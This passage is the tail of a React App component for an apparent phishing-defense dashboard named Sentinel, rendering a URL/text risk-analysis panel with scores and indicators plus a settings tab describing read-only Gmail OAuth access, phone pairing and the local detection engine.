                  onChange={(e) => setSandboxText(e.target.value)}
                />
              )}

              <div className="analyze-actions">
                <button
                  className="connect-button analyze-submit-btn"
                  onClick={handleAnalyzeSandbox}
                  disabled={isAnalyzingSandbox}
                >
                  {isAnalyzingSandbox ? <RefreshCw size={14} className="spin" /> : <ShieldCheck size={15} />}
                  {isAnalyzingSandbox ? "Analyzing Threat Indicators..." : (sandboxMode === "url" ? "Check URL" : "Inspect Text")}
                </button>

                <button
                  className="text-button clear-btn"
                  onClick={handleClearSandbox}
                  disabled={isAnalyzingSandbox}
                >
                  Clear
                </button>
              </div>

              {sandboxError && (
                <div className="analysis-alert error">
                  <AlertTriangle size={16} />
                  <span>{sandboxError}</span>
                </div>
              )}

              {sandboxResult && (
                <div className={`analysis-result-card risk-${sandboxResult.risk_level.toLowerCase()}`}>
                  <div className="result-header">
                    <div className="result-risk-badge">
                      {sandboxResult.risk_level === "HIGH" ? <AlertTriangle size={15} /> : <CheckCircle2 size={15} />}
                      <span>{sandboxResult.risk_level} RISK</span>
                    </div>
                    <div className="result-score-tag">
                      <span>Score: </span><strong>{sandboxResult.risk_score} / 100</strong>
                    </div>
                  </div>

                  <p className="result-summary">{sandboxResult.message}</p>

                  <div className="result-reasons">
                    <p className="section-label">DETECTED INDICATORS &amp; EVIDENCE</p>
                    <ul>
                      {sandboxResult.reasons?.map((r, i) => (
                        <li key={i}>
                          <span className="reason-bullet" />
                          <span>{r}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>
              )}
            </div>
          </section>
        )}

        {/* SETTINGS TAB */}
        {active === "Settings" && (
          <section className="panel" style={{ marginTop: 0 }}>
            <div className="panel-header">
              <div>
                <p className="section-label">NODE CONFIGURATION &amp; ACCESS REVOCATION</p>
                <h3>Security Settings &amp; Permissions</h3>
              </div>
            </div>

            <div style={{ padding: "24px", color: "#8a96a0", fontSize: "12px", lineHeight: "1.8" }}>
              <h4>Google OAuth &amp; Gmail Access</h4>
              <p>
                Sentinel connects via official Google OAuth 2.0 with read-only permissions (<code>https://www.googleapis.com/auth/gmail.readonly</code>). Sentinel can never send, delete, or modify emails.
              </p>
              {status.gmail.connected && (
                <div style={{ margin: "14px 0" }}>
                  <button className="connect-button btn-danger-bg" onClick={disconnectGmail}>
                    Disconnect Gmail Account
                  </button>
                  <p style={{ marginTop: "8px", fontSize: "11px", color: "#66727d" }}>
                    To revoke access entirely from your Google Account, visit <a href="https://myaccount.google.com/permissions" target="_blank" rel="noreferrer" style={{ color: "#8be9fd" }}>Google Account Third-Party Permissions</a>.
                  </p>
                </div>
              )}

              <hr style={{ borderColor: "#1d2329", margin: "20px 0" }} />

              <h4>Phone Defense &amp; Android Companion</h4>
              <p>
                Phone verification binds your phone number for identity and notification alerts. Real-time SMS interception runs locally via the Android Companion app using <code>NotificationListenerService</code>.
              </p>
              {status.phone.verified && (
                <div style={{ margin: "14px 0" }}>
                  <button className="connect-button btn-danger-bg" onClick={handleDisconnectPhone}>
                    Disconnect Phone Number &amp; Revoke Pairing Key
                  </button>
                </div>
              )}

              <hr style={{ borderColor: "#1d2329", margin: "20px 0" }} />

              <h4>AI Engine &amp; Execution Environment</h4>
              <p>
                <strong>Engine:</strong> Python Flask hybrid pipeline (TF-IDF Logistic Regression + Knowledge Base Rules + Bayesian Math + Fuzzy Logic).<br />
                <strong>URL Checking:</strong> Safe local heuristics with zero outbound network requests.
              </p>
            </div>
          </section>
        )}
      </main>
    </div>
  );
}

export default App;